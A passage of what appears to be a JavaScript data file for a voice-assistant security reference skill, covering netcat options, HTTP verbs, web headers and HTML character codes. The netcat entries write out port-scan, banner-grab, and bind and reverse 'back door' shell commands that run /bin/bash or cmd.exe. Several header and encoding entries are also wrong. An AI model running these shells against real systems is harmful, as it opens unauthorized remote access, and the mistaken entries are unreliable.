    "command options": { "speech": "command flags are: dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity.", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
    "command line options": { "speech": "command flags are: dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity.", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
    "flags": { "speech": "command flags are: dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity.", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
    "command flags": { "speech": "command flags are: dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity.", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
    "port scan": { "speech": "To create a NetCat port scan, at the command prompt type NC space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number.", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
    "banner grabber": { "speech": "To create a NetCat banner grabber, the instructions are complicated so follow the instructions on the response card in the Alexa app.", "card": "echo \"\" | nc -v -n -w1 [TargetIPAddr] [start_port]-[end-port]"},
    "listening back door shell linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type NC space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space and forward slash bin forwardslash bash.", "card": "nc -l -p [LocalPort] -e /bin/bash"},
    "listening back door shell Windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type NC space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E.", "card": "nc -l -p [LocalPort] -e cmd.exe"},
    "reverse back door shell linux": { "speech": "To create reverse back door shell with NetCat shell on Linux, at the command prompt type NC space followed by your IP Address followed by a space and the port you want to connect to, followed by a space dash E space and forward slash bin forwardslash bash.", "card": "nc [YourIPAddr] [LocalPort] -e /bin/bash"},
    "reverse back door shell Windows": { "speech": "To create a reverse back door shell with NetCat shell on Windows, at the command prompt type NC space followed by your IP Address followed by a space and the port you want to connect to, followed by a space dash E space folowed by C M D dot E X E.", "card": "nc [YourIPAddr] [LocalPort] -e cmd.exe"},
    "back door shell linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type NC space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space forward slash bin forwardslash bash.", "card": "nc -l -p [LocalPort] -e /bin/bash"},
    "back door shell Windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type NC space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E.", "card": "nc -l -p [LocalPort] -e cmd.exe"},
    "back door shell on linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type NC space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space and forward slash bin forwardslash bash.", "card": "nc -l -p [LocalPort] -e /bin/bash"},
    "back door shell on Windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type NC space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E.", "card": "nc -l -p [LocalPort] -e cmd.exe"},
    "reverse back door shell on linux": { "speech": "To create reverse back door shell with NetCat shell on Linux, at the command prompt type NC space followed by your IP Address followed by a space and the port you want to connect to, followed by a space dash E space and forward slash bin forwardslash bash.", "card": "nc [YourIPAddr] [LocalPort] -e /bin/bash"},
    "reverse back door shell on Windows": { "speech": "To create a reverse back door shell with NetCat shell on Windows, at the command prompt type NC space followed by your IP Address followed by a space and the port you want to connect to, followed by a space dash E space folowed by C M D dot E X E.", "card": "nc [YourIPAddr] [LocalPort] -e cmd.exe"}
} };

const httpverbs = { "HTTPVERBS_EN_US": {
	"all": "RFC 2616 includes get, head, post, put, delete, connect, options and trace. Other RFC's include Prop find, prop patch, m k c o l, copy, move, lock, lock, unlock. Version dash control, report, checkout, checkin, un checkout m k workspace, update, label, baseline-control, merge and m k activity, order patch, A C L, patch and search and of course XML http request. Web Dave methods include B copy, b delete, b move, b propfind, b prop patch, notify, poll, subscribe, unsubscribe, x dash m s dash enum atts.",
	"get": "requests data. Typically a GET request will fetch data pointed to by a URL. GET parameters are visible in the URL and are stored in the browser history. GET acts as a Read in the context of restful web services. GET returns a 200 OK or 404 not found.",
	"post" : "Requests the content of a URL with parameters passed in the body of the request. Passed parameters are not visible in browser history. In Restful web services POST is similar to Create and will return an error 409 if the resource already exists.",
	"put" : "Put, replaces remote data with the current contents of the payload. PUT is used in restful web services as an Update or Replace function. It a restful context it returns 200 upon success, 204 no content if invalid or 404 not found.",
	"delete" : "Delete, was intended for deletion of files if the server supports the verb, however it is generally used in restful web services to deleted a specific record. A restful delete operation returns a 200 ok if successful or a 404 not found if the ID was not found.",
	"options" : "Options typically fetches the communicatons methods for a particular resource.",
	"trace" : "Trace is intended to perform a loop-back test along the path to the target resource.",
	"connect" : "Connect establishes a tunnel to the server which is providing the resource.",
	"xml http request" : "XML HTTP request makes a request to a web resource which is done asynchronously. XML HTTP requests will have what is called a pre-flight check to validate permission to access the domain of the requested resource.",
	"x. m. l. http request" : "XML HTTP request makes a request to a web resource which is done asynchronously. XML HTTP requests will have what is called a pre-flight check to validate permission to access the domain of the requested resource.",
	"patch" : "Patch was intended to apply partial modifications to a resource. In restful web services Patch can be used to update or modify a record.  It a restful context it returns 200 upon success, 204 no content if invalid or 404 not found.",
	"prop find" : "Prop find web-dav verb returns information about an outlook resource. It can have a depth header setting of 0 or 1. 0 returns properties for the resource only. One will return properties for the resource and it\'s children.",
	"prop patch" : "Prop patch web-dav verb patches or updates properties of a resource in Outlook web resources.",
	"notify" : "Notify is a web-dav verb that can be used to send a notification to all clients.",
	"b copy" : "B copy is a web-dav verb that performs a copy on a resource but must have a request body. It requires an XML target element.",
	"b move" : "B move is a web-dav verb that performs a move on a resource but must include a request body. The request body contains an XML target element.",
	"b prop find" : "B prop find is a web-dav verb that finds a property of a resource but includes a request body. The request body contains an XML target element.",
	"b prop patch" : "B prop patch is a web-dav verb that updates a resource. It requires a request body which contains an XML target element.",
	"b. copy" : "B copy is a web-dav verb that performs a copy on a resource but must have a request body. It requires an XML target element.",
	"b. move" : "B move is a web-dav verb that performs a move on a resource but must include a request body. The request body contains an XML target element.",
	"b. prop find" : "B prop find is a web-dav verb that finds a property of a resource but includes a request body. The request body contains an XML target element.",
	"b. prop patch" : "B prop patch is a web-dav verb that updates a resource. It requires a request body which contains an XML target element.",
	"copy" : "The copy web-dav verb creates a copy of an object. It can apply to a single resource or to all children of the resource given a depth header value.",
	"b delete" : "The delete web-dav verb deletes a copy of an object. It can have a depth header set for deleting child objects as well.",
	"b. delete" : "The delete web-dav verb deletes a copy of an object. It can have a depth header set for deleting child objects as well.",
	"lock" : "The lock web-dav verb performs a write-lock on a resource. It can have a depth header set to apply to child objects as well.",
	"m k col" : "The M K col web-dav verb creates a new collection at the resource location.",
	"m. k. col" : "The M K col web-dav verb creates a new collection at the resource location.",
	"move" : "The move web-dav verb moves a resource. It may have a depth header set to indicate if child items are moved as well.",
	"poll" : "The poll web-dav verb can be used to determine if a client has recieved an event notification or query for what events have fired.",
	"search" : "The search web-dav verb is used to search a Microsoft exchange store for a resource.",
	"subscribe" : "The subscribe web-dav verb is used to create a subscription to a resource.",
	"unlock" : "The unlock web-dav verb is used to unlock a resource at the request URI that is locked.",
	"unsubscribe" : "The unsubscribe web-dae verb is used to end a subscription to a resource.",
	"x ms enum atts" : "The x M S enum atts method is used to enumerate email attachment properties in an outlook web.",
	"x. m. s. enum atts" : "The x M S enum atts method is used to enumerate email attachment properties in an outlook web."
	} };
	
const webheaders = { "WEBHEADERS_EN_US": {
	"all": "Request headers and response headers. There are headers to prevent xss, cross origin requests and other security features. Some headers have to do with the referer and information about the user-agent. Unfortunately, a complete list would take too long to read.",
	"accept" : "The accept request header notifies the server of what mime types the browser supports.",
	"accept charset" : "The accept-char set request header notifies the server what character sets the browser understands.",
	"accept char set" : "The accept-char set request header notifies the server what character sets the browser understands.",
	"accept encoding" : "The accept-encoding request header tells the server which encodings and compression the browser will accept, like G zip, deflate etcetera.",
	"accept language" : "The accept-language request header advertises which languages the browser is able to understand.",
	"accept ranges" : "The accept-ranges response header is used by the server to tell the browser if it will accept partial requests.",
	"access control allow credentials" : "The access-control-allow-credentials response header indicates whether or not the response to the request can be written to the page. It can be used if the returned value is true. This header can be used in pre-flight requests to validate whether credentials can be used as part of an XHR request.",
	"access control allow headers" : "The access-control-allow-credentials header is a response header which is used in pre-flight requests to determine which HTTP headers will be available via the Access-control-expose-headers header when making the XHR request.",
	"access control allow methods" : "The access-control-allow-methods header is a response header which indicates what methods are allowed when fetching the resource in the response to a preflight request.",
	"access control allow origin" : "The access-control-allow-origin header is a response header which tells the browser whether the response can be shared with resources with the given origin.",
	"access control expose headers" : "The access-control-expose-headers response header lets the requestor know which headers can be exposed as part of the response by listing them for the browser.",
	"access control max age" : "The access-control-max-age header is a response header that tells the browser how long the results of a pre-flight request can be cached.",
	"access control request headers" : "The access-control-request-headers is a request header that is used when making a pre-flight request to notify the server which HTTP headers will be used during the XHR request.",
	"access control request method" : "The access-control-request-method header is a request header that is used when making pre-flight requests to notify the server which HTTP method will be used when making the request. This header is required because the pre-flight check uses the options verb and does not use the same method as the final request.",
	"age" : "The age header contains the time in seconds that the item has been cached.",
	"cache control" : "The cache-control header is a general header that specifies cache options for either requests and responses but both client and server are required to provide this header as needed.",
	"connection" : "The connection is a general header that specifies whether the network connection stays open after the current transaction finishes. If the value is keep-alive then the connection is persistent. Subsequent headers used in the following requests must be specified in the connection header so a proxy knows it needs to consume them and not pass them on.",
	"content disposition" : "The content-disposition response header indicates whether the content should be displayed in-line in the browser. In a multi-part form data body the HTTP content disposition general header can be used on a part of the multi-part body to give added information to that data segment. Sub-parts are delimited by boundary delimiters.",
	"content encoding" : "The content-encoding header is an entity header that specifies compression of the media-type. It can tell the client how to decode in order to obtain the media type specified by the content-type header.",
	"content language" : "The content-language header is an entity header that describes the languages to be consumed by the client. If no content language header is included then the content is assumed to be for all languages.",
	"content length" : "The content-length header is an entity header that specifes the size of the entity body in a decimal number of octets and is intended to be evaluated by the recipient.",
	"content location" : "The content-location header tells the browser of an alternate location for the data. Content-Location usually returns the direct URL of the resource being transmitted during content negotiation.",
	"content security-policy" : "The content-security-policy header is a response header that provides a means for controlling what content sources and domains are allowed to serve trusted site content. It also can control cross site script and many other security related settings which can be tailored to specific needs and to allow specific functions to be provided by trusted domains.",
	"content security-policy-report-only" : "The conent-security-policy-report-only header will allow a web site developer to test but not enforce aspects of policy that will later be used in the Content Security Policy header. Activities that would be blocked are reported.",
	"content type" : "The content-type header helps test policies by monitoring policy effects in a detect mode versus preventing the activity in question.",
	"cookie" : "The cookie header contains stored HTTP cookies that were sent by the server using the set dash cookie header.",
	"cookie two" : "The cookie 2 header is obsolete but may be honored by some browsers for backward compatability. Most browser will ignore it and use the cookie header only.",
	"d n t" : "The D N T header is the do not track request header, telling the server the user values privacy over usability while interacting with the site.",
	"d. n. t." : "The D N T header is the do not track request header, telling the server the user values privacy over usability while interacting with the site.",
	"date" : "The date header is a general header which stores the date and time that the message was created.",
	"e tag" : "The E tag header is a response header which identifies a specific version of a requsted object by effectively being a hash value of a resource. This allows the resource to be uniquely identified and it improves cache efficiency because the server does not have to resend the whole response if the content has not changed.",
	"e. tag" : "The E tag header is a response header which identifies a specific version of a requsted object by effectively being a hash value of a resource. This allows the resource to be uniquely identified and it improves cache efficiency because the server does not have to resend the whole response if the content has not changed.",
	"expires" : "The expires header provides the date and time after which the content is expired or needs to be re-fetched",
	"from" : "The from header is composed of an email address for a user who controls the browser or user agent. If you program a bot, it should include the From header so you can be notified if the bot traffic is problematic.",
	"host" : "The host header specifies the fully qualified domain name of the server and may include the port number the server is listening on.",
	"if match" : "The if-match header is a request header which returns content if the resource etag matches one specified in the request. It can be used as a version control mechanism limiting uploads that would be duplicate or it can be used with a Range header to ensure that new ranges requested come from the same resource as previously checked. If the match is invalid then a 416 is returned.",
	"if modified since" : "The if-modified-since header is a request header. The server will return the resource with a 200 OK if the resource was modified last after the date specified, otherwise it returns a 304.",
	"if none match" : "The if-none-match header is a request header. The server will only send back a 200 OK if none of the requested resources match the e-tags provided.",
	"if range" : "The if-range header is a request header that is conditional. If the condition is met the resource is returned. This can be used with e tag or last dash modified headers.",
	"if unmodified since" : "The if-unmodified-since header is a request header. It will return the resource if the condition is met. If the resource is modified since the date then the server returns a 412.",
	"keep alive" : "The keep-alive header is a general header and is not standard. Do not use in production sites as it will not work for all users. The keep alive header tries to instruct the server on how to maintain the connection and what a maximum time-out period may be.",
	"last modified" : "The last-modified response header details the date and time the server resource was last modified.",
	"location" : "The location header is a response header that tells the browser which page to redirect to. It is only effective when returned with a 300 to 399 range response code",
	"origin" : "The origin request header returns the name of the server that is serving the requested content. This header is sent with POST and with CORS requests. It is similar to the referer header but does not show path information.",
	"pragma" : "The pragma header is a general header. It is used for backward compatability with HTTP version 1 caches if cache-control headers are not specified.",
	"public key pins" : "The public-key-pins header is a response header that associates a public key with a specific web server to reduce the risk of MITM attacks. If a pin DOS is attempted using fake keys, the browser should ignore the pin request.",
	"public key pins report only" : "The public-key-pins-report-only response header sends a reports of pinning errors to the report URI specified in the header. This header will not enforce pinning, but only report problems with it. As such, it can be used to test pinning.",
	"referer" : "The referer header is a request header that specifies the address of the previoius page from which the current link was followed.",
	"referrer policy" : "The referer-policy header specifies which referrer information should be included in requests.",
	"retry after" : "The retry-after header is a response header that tells the browser how long it should wait before making a follow-up request. When sent a 503 it specifies how long the browser should wait for the unavailable resource. If send a 301, it will tell the browser the minimum time to wait before redirecting.",
	"server" : "The server header indicates the server software type and possibly version number. The server header can tell an attacker what technologies are running and what may be vulnerable based on version numbers.",
	"set cookie" : "The set-cookie header is used to send cookies from the server to the browser.",
	"set cookie two" : "The set-cookie 2 response header has been deprecated and is not supported by modern browsers.",
	"strict transport security" : "The strict transport security header is a response header that tells the browser that it should only browse the server using HTTPS rather than HTTP.",
	"te" : "The TE header is a request header that determines the transfer encodings the browser can process. Chunked encoding is always accepted by default in modern browsers.",
	"tk" : "The TK header is a response header that provides tracking status for requests. Statuses include, exclamation, question mark, G, N for no tracking. T stands for tracking. C is tracking with consent. D equals disregard do not track. etc.",
	"t e" : "The TE header is a request header that determines the transfer encodings the browser can process. Chunked encoding is always accepted by default in modern browsers.",
	"t k" : "The TK header is a response header that provides tracking status for requests. Statuses include, exclamation, question mark, G, N for no tracking. T stands for tracking. C is tracking with consent. D equals disregard do not track. etc.",
	"t. e." : "The TE header is a request header that determines the transfer encodings the browser can process. Chunked encoding is always accepted by default in modern browsers.",
	"t. k." : "The TK header is a response header that provides tracking status for requests. Statuses include, exclamation, question mark, G, N for no tracking. T stands for tracking. C is tracking with consent. D equals disregard do not track. etc.",
	"trailer" : "The trailer header is a response header that allows for the inclusion of additional fields at the end of chuncked messages which may contain dynamically generated data appended to the message body, like CRC checks, digital signatures or post processing indicators.",
	"transfer encoding" : "The transfer-encoding header is similar to content dash encoding header but is specific to each discreet message. It often is returned in response to a HEAD request indicating how it would return the corresponding get request. Examples are chunked, deflate, gzip etcetera.",
	"upgrade insecure requests" : "The upgrade-insecure-requests header is a request header that tells the server that the browser wants to enable encryption if possible. True equals the value of 1 in this case.",
	"user agent" : "The user-agent header is a request header that tells the server what kind of browser is connecting to it. User agent strings can be altered. Do not fully rely on the information provided.",
	"vary" : "The vary response header helps decide how to match future request headers to decide whether a cached response can be used versus requesting a new copy from the server.",
	"via" : "The via header is a general header added by proxies. It can be either in request or response headers. I helps in traffic issues and identifying the protocol options of the sending nodes that help serve and proxy the reqeusts.",
	"warning" : "The warning header is a general header that contains information about errors or problems. Multiple warnings may be queued in the same response. For example, warn dash agent, warn dash text, warn dash date, etc.",
	"x content type options" : "The X-content-type options response header is used to indicate mime types noted in the content type header should not be changed. This header was intended to block mime types from being changed to executable types. The no sniff setting is intended to prevent content type alteration as part of an attack.",
	"x. content type options" : "The X-content-type options response header is used to indicate mime types noted in the content type header should not be changed. This header was intended to block mime types from being changed to executable types. The no sniff setting is intended to prevent content type alteration as part of an attack.",
	"x d n s prefetch control" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"d n s prefetch" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"x. d. n. s. prefetch control" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"d. n. s. prefetch" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"xcontent type options" : "The X-content-type options response header is used to indicate mime types noted in the content type header should not be changed. This header was intended to block mime types from being changed to executable types. The no sniff setting is intended to prevent content type alteration as part of an attack.",
	"xdns prefetch control" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"dns prefetch" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"x frame options" : "The X-frame-options header is intended to prevent the browser from rendering the page within an iframe to thwart iframe overlay or content replacement patterns common to watering hole attacks",
	"x. frame options" : "The X-frame-options header is intended to prevent the browser from rendering the page within an iframe to thwart iframe overlay or content replacement patterns common to watering hole attacks",
	"xxss protection" : "The X-dash-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"xxss" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"x. x. s. s. protection" : "The X-dash-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"x. x. s. s." : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"xframe options" : "The X-frame-options header is intended to prevent the browser from rendering the page within an iframe to thwart iframe overlay or content replacement patterns common to watering hole attacks",
	"x x s s protection" : "The X-dash-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"x x s s" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"cross site scripting" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings.",
	"cross site scripting protection" : "The X-XSS-Protection header is a response header that is intended to instruct the browser not to render pages that contain cross site script or script that is not sourced from the pages original fully qualified domain name. In newer browsers, content security policy can provide greater flexibility for setting script domain sourcing options and many other security settings."
	} };
	
const htmlencodings = {   "HTML_EN_US" : {
        "null": { "speech": "ampersand pound 0 semi-colon", "card" : "&#0;"},
        "bell": { "speech": "ampersand pound 7 semi-colon", "card" : "&#7;"},
        "back space": { "speech": "ampersand pound 8 semi-colon", "card" : "&#8;"},
        "tab": { "speech": "ampersand pound 9 semi-colon", "card" : "&#9;"},
        "line feed": { "speech": "ampersand pound 10 semi-colon", "card" : "&#10;"},
		"enter": { "speech": "ampersand pound 10 semi-colon", "card" : "&#10;"},
        "vertical tab": { "speech": "ampersand pound 11 semi-colon", "card" : "&#11;"},
        "form feed": { "speech": "ampersand pound 12 semi-colon", "card" : "&#12;"},
        "carriage return": { "speech": "ampersand pound 13 semi-colon", "card" : "&#13;"},
        "return": { "speech": "ampersand pound 13 semi-colon", "card" : "&#13;"},
        "data line escape": { "speech": "ampersand pound 16 semi-colon", "card" : "&#16;"},
        "negative ack": { "speech": "ampersand pound 21 semi-colon", "card" : "&#21;"},
        "syn": { "speech": "ampersand pound 22 semi-colon", "card" : "&#22;"},
        "end of block": { "speech": "ampersand pound 23 semi-colon", "card" : "&#23;"},
        "cancel": { "speech": "ampersand pound 24 semi-colon", "card" : "&#24;"},
        "escape": { "speech": "ampersand pound 27 semi-colon", "card" : "&#27;"},
        "space": { "speech": "ampersand pound 32 semi-colon or, ampersand n b s p semi-colon", "card" : "&#32; or &nbsp;"},
        "exclamation": { "speech": "ampersand pound 33 semi-colon or, ampersand i e x c l semi-colon", "card" : "&#33; or &iexcl;"},
        "double quote": { "speech": "ampersand pound 34 semi-colon or, ampersand q u o t semi-colon", "card" : "&#34; or &quot;"},
        "pound": { "speech": "ampersand pound 35 semi-colon", "card" : "&#35;"},
        "hash": { "speech": "ampersand pound 35 semi-colon", "card" : "&#35;"},
        "dollar sign": { "speech": "ampersand pound 36 semi-colon", "card" : "&#36;"},
        "percent": { "speech": "ampersand pound 37 semi-colon", "card" : "&#37;"},
        "ampersand": { "speech": "ampersand pound 38 semi-colon or, ampersand a m p semi-colon", "card" : "&#38; or &amp;"},
        "single quote": { "speech": "ampersand pound 39 semi-colon", "card" : "&#39;"},
        "left paren": { "speech": "ampersand pound 40 semi-colon", "card" : "&#40;"},
        "right paren": { "speech": "ampersand pound 41 semi-colon", "card" : "&#41;"},
        "star": { "speech": "ampersand pound 42 semi-colon", "card" : "&#42;"},
        "plus": { "speech": "ampersand pound 43 semi-colon", "card" : "&#43;"},
        "comma": { "speech": "ampersand pound 44 semi-colon", "card" : "&#44;"},
        "minus": { "speech": "ampersand pound 45 semi-colon", "card" : "&#45;"},
        "period": { "speech": "ampersand pound 46 semi-colon", "card" : "&#46;"},
        "forward slash": { "speech": "ampersand pound 47 semi-colon", "card" : "&#47;"},
        "zero": { "speech": "ampersand pound 48 semi-colon", "card" : "&#48;"},
        "one": { "speech": "ampersand pound 49 semi-colon", "card" : "&#49;"},
        "two": { "speech": "ampersand pound 50 semi-colon", "card" : "&#50;"},
        "three": { "speech": "ampersand pound 51 semi-colon", "card" : "&#51;"},
        "four": { "speech": "ampersand pound 52 semi-colon", "card" : "&#52;"},
        "five": { "speech": "ampersand pound 53 semi-colon", "card" : "&#53;"},
        "six": { "speech": "ampersand pound 54 semi-colon", "card" : "&#54;"},
        "seven": { "speech": "ampersand pound 55 semi-colon", "card" : "&#55;"},
        "eight": { "speech": "ampersand pound 56 semi-colon", "card" : "&#56;"},
        "nine": { "speech": "ampersand pound 57 semi-colon", "card" : "&#57;"},
        "colon": { "speech": "ampersand pound 58 semi-colon", "card" : "&#58;"},
        "semicolon": { "speech": "ampersand pound 59 semi-colon", "card" : "&#59;"},
        "less than": { "speech": "ampersand pound 60 semi-colon", "card" : "&#60;"},
        "equals": { "speech": "ampersand pound 61 semi-colon", "card" : "&#61;"},
        "equal sign": { "speech": "ampersand pound 61 semi-colon", "card" : "&#61;"},
        "equal": { "speech": "ampersand pound 61 semi-colon", "card" : "&#61;"},
        "greater than": { "speech": "ampersand pound 62 semi-colon", "card" : "&#62;"},
        "question mark": { "speech": "ampersand pound 63 semi-colon", "card" : "&#63;"},
        "at sign": { "speech": "ampersand pound 64 semi-colon", "card" : "&#64;"},
        "at": { "speech": "ampersand pound 64 semi-colon", "card" : "&#64;"},
        "capital a": { "speech": "ampersand pound 65 semi-colon", "card" : "&#65;"},
        "capital b": { "speech": "ampersand pound 66 semi-colon", "card" : "&#66;"},
        "capital c": { "speech": "ampersand pound 67 semi-colon", "card" : "&#67;"},
        "capital d": { "speech": "ampersand pound 68 semi-colon", "card" : "&#68;"},
        "capital e": { "speech": "ampersand pound 69 semi-colon", "card" : "&#69;"},
        "capital f": { "speech": "ampersand pound 70 semi-colon", "card" : "&#70;"},
        "capital g": { "speech": "ampersand pound 71 semi-colon", "card" : "&#71;"},
        "capital h": { "speech": "ampersand pound 72 semi-colon", "card" : "&#72;"},
        "capital i": { "speech": "ampersand pound 73 semi-colon", "card" : "&#73;"},
        "capital j": { "speech": "ampersand pound 74 semi-colon", "card" : "&#74;"},
        "capital k": { "speech": "ampersand pound 75 semi-colon", "card" : "&#75;"},
        "capital l": { "speech": "ampersand pound 76 semi-colon", "card" : "&#76;"},
        "capital m": { "speech": "ampersand pound 77 semi-colon", "card" : "&#77;"},
        "capital n": { "speech": "ampersand pound 78 semi-colon", "card" : "&#78;"},
        "capital o": { "speech": "ampersand pound 79 semi-colon", "card" : "&#79;"},
        "capital p": { "speech": "ampersand pound 80 semi-colon", "card" : "&#80;"},
        "capital q": { "speech": "ampersand pound 81 semi-colon", "card" : "&#81;"},
        "capital r": { "speech": "ampersand pound 82 semi-colon", "card" : "&#82;"},
        "capital s": { "speech": "ampersand pound 83 semi-colon", "card" : "&#83;"},
        "capital t": { "speech": "ampersand pound 84 semi-colon", "card" : "&#84;"},
        "capital u": { "speech": "ampersand pound 85 semi-colon", "card" : "&#85;"},
        "capital v": { "speech": "ampersand pound 86 semi-colon", "card" : "&#86;"},
        "capital w": { "speech": "ampersand pound 87 semi-colon", "card" : "&#87;"},
        "capital x": { "speech": "ampersand pound 88 semi-colon", "card" : "&#88;"},
        "capital y": { "speech": "ampersand pound 89 semi-colon", "card" : "&#89;"},
        "capital z": { "speech": "ampersand pound 90 semi-colon", "card" : "&#90;"},
		"upper case a": { "speech": "ampersand pound 65 semi-colon", "card" : "&#65;"},
        "upper case b": { "speech": "ampersand pound 66 semi-colon", "card" : "&#66;"},
        "upper case c": { "speech": "ampersand pound 67 semi-colon", "card" : "&#67;"},
        "upper case d": { "speech": "ampersand pound 68 semi-colon", "card" : "&#68;"},
        "upper case e": { "speech": "ampersand pound 69 semi-colon", "card" : "&#69;"},
        "upper case f": { "speech": "ampersand pound 70 semi-colon", "card" : "&#70;"},
        "upper case g": { "speech": "ampersand pound 71 semi-colon", "card" : "&#71;"},
        "upper case h": { "speech": "ampersand pound 72 semi-colon", "card" : "&#72;"},
        "upper case i": { "speech": "ampersand pound 73 semi-colon", "card" : "&#73;"},
        "upper case j": { "speech": "ampersand pound 74 semi-colon", "card" : "&#74;"},
        "upper case k": { "speech": "ampersand pound 75 semi-colon", "card" : "&#75;"},
        "upper case l": { "speech": "ampersand pound 76 semi-colon", "card" : "&#76;"},
        "upper case m": { "speech": "ampersand pound 77 semi-colon", "card" : "&#77;"},
        "upper case n": { "speech": "ampersand pound 78 semi-colon", "card" : "&#78;"},
        "upper case o": { "speech": "ampersand pound 79 semi-colon", "card" : "&#79;"},
        "upper case p": { "speech": "ampersand pound 80 semi-colon", "card" : "&#80;"},
        "upper case q": { "speech": "ampersand pound 81 semi-colon", "card" : "&#81;"},
        "upper case r": { "speech": "ampersand pound 82 semi-colon", "card" : "&#82;"},
        "upper case s": { "speech": "ampersand pound 83 semi-colon", "card" : "&#83;"},
        "upper case t": { "speech": "ampersand pound 84 semi-colon", "card" : "&#84;"},
        "upper case u": { "speech": "ampersand pound 85 semi-colon", "card" : "&#85;"},
        "upper case v": { "speech": "ampersand pound 86 semi-colon", "card" : "&#86;"},
        "upper case w": { "speech": "ampersand pound 87 semi-colon", "card" : "&#87;"},
        "upper case x": { "speech": "ampersand pound 88 semi-colon", "card" : "&#88;"},
        "upper case y": { "speech": "ampersand pound 89 semi-colon", "card" : "&#89;"},
        "upper case z": { "speech": "ampersand pound 90 semi-colon", "card" : "&#90;"},
        "left square bracket": { "speech": "ampersand pound 91 semi-colon", "card" : "&#91;"},
        "slash": { "speech": "ampersand pound 92 semi-colon", "card" : "&#92;"},
        "right square bracket": { "speech": "ampersand pound 93 semi-colon", "card" : "&#93;"},
        "carret": { "speech": "ampersand pound 94 semi-colon", "card" : "&#94;"},
        "underscore": { "speech": "ampersand pound 95 semi-colon", "card" : "&#95;"},
